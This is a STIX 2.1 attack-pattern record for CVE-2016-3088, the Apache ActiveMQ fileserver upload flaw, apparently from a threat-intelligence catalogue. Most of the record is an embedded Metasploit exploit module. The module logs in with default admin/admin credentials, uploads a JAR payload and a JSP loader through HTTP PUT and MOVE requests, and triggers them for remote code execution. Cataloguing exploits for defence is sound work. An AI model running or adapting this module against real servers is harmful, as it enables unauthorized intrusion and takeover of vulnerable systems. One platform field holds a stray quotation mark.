{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--648910e0-de5f-48cb-a66a-1d225f833979",
    "created": "2024-08-14T17:08:17.979615Z",
    "modified": "2024-08-14T17:08:17.979619Z",
    "name": "ActiveMQ web shell upload",
    "description": "( The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_activemq_upload_jsp.rb",
            "external_id": "apache_activemq_upload_jsp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3088"
        },
        {
            "source_name": "reference",
            "url": "http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ActiveMQ web shell upload',\n      'Description' => %q(\n        The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0\n        allows remote attackers to upload and execute arbitrary files via an\n        HTTP PUT followed by an HTTP MOVE request.\n      ),\n      'Author'      => [ 'Ian Anderson <andrsn84[at]gmail.com>', 'Hillary Benson <1n7r1gu3[at]gmail.com>' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2016-3088' ],\n          [ 'URL', 'http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ java linux win },\n      'Targets'     =>\n        [\n          [ 'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Windows',\n             {\n               'Platform' => 'win',\n               'Arch' => ARCH_X86\n             }\n           ]\n        ],\n      'DisclosureDate' => '2016-06-01',\n      'DefaultTarget'  => 0))\n    register_options(\n      [\n        OptString.new('BasicAuthUser', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('BasicAuthPass', [ true, 'The password for the specified username', 'admin' ]),\n        OptString.new('JSP', [ false, 'JSP name to use, excluding the .jsp extension (default: random)', nil ]),\n        OptString.new('AutoCleanup', [ false, 'Remove web shells after callback is received', 'true' ]),\n        Opt::RPORT(8161)\n      ])\n    register_advanced_options(\n      [\n        OptString.new('UploadPath', [false, 'Custom directory into which web shells are uploaded', nil])\n      ])\n  end\n\n  def jsp_text(payload_name)\n    %{\n    <%@ page import=\"java.io.*\"\n    %><%@ page import=\"java.net.*\"\n    %><%\n    URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath(\"./#{payload_name}.jar\")).toURI().toURL()});\n    Class c = cl.loadClass(\"metasploit.Payload\");\n    c.getMethod(\"main\",Class.forName(\"[Ljava.lang.String;\")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});\n    %>}\n  end\n\n  def exploit\n    jar_payload = payload.encoded_jar.pack\n    payload_name = datastore['JSP'] || rand_text_alpha(8 + rand(8))\n    host = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n    @url = datastore['SSL'] ? \"https://#{host}\" : \"http://#{host}\"\n    paths = get_upload_paths\n    paths.each do |path|\n      if try_upload(path, jar_payload, payload_name)\n        break handler if trigger_payload(payload_name)\n        print_error('Unable to trigger payload')\n      end\n    end\n  end\n\n  def try_upload(path, jar_payload, payload_name)\n    ['.jar', '.jsp'].each do |ext|\n      file_name = payload_name + ext\n      data = ext == '.jsp' ? jsp_text(payload_name) : jar_payload\n      move_headers = { 'Destination' => \"#{@url}/#{path}/#{file_name}\" }\n      upload_uri = normalize_uri('fileserver', file_name)\n      print_status(\"Uploading #{move_headers['Destination']}\")\n      register_files_for_cleanup \"#{path}/#{file_name}\" if datastore['AutoCleanup'].casecmp('true')\n      return error_out unless send_request('PUT', upload_uri, 204, 'data' => data) &&\n                              send_request('MOVE', upload_uri, 204, 'headers' => move_headers)\n      @trigger_resource = /webapps(.*)/.match(path)[1]\n    end\n    true\n  end\n\n  def get_upload_paths\n    base_path = \"#{get_install_path}/webapps\"\n    custom_path = datastore['UploadPath']\n    return [normalize_uri(base_path, custom_path)] unless custom_path.nil?\n    [ \"#{base_path}/api/\", \"#{base_path}/admin/\" ]\n  end\n\n  def get_install_path\n    properties_page = send_request('GET', \"#{@url}/admin/test/\")\n    fail_with(Failure::UnexpectedReply, 'Target did not respond with 200 OK to a request to /admin/test/!') if properties_page == false\n    properties_page = properties_page.body\n    match = properties_page.match(/activemq\\.home=([^,}]+)/)\n    return match[1] unless match.nil?\n  end\n\n  def send_request(method, uri, expected_response = 200, opts = {})\n    opts['headers'] ||= {}\n    opts['headers']['Authorization'] = basic_auth(datastore['BasicAuthUser'], datastore['BasicAuthPass'])\n    opts['headers']['Connection'] = 'close'\n    r = send_request_cgi(\n      {\n        'method'  => method,\n        'uri'     => uri\n      }.merge(opts)\n    )\n    if r.nil?\n      fail_with(Failure::Unreachable, 'Could not reach the target!')\n    end\n    return false if expected_response != r.code.to_i\n    r\n  end\n\n  def trigger_payload(payload_name)\n    send_request('POST', @url + @trigger_resource + payload_name + '.jsp')\n  end\n\n  def error_out\n    print_error('Upload failed')\n    @trigger_resource = nil\n    false\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}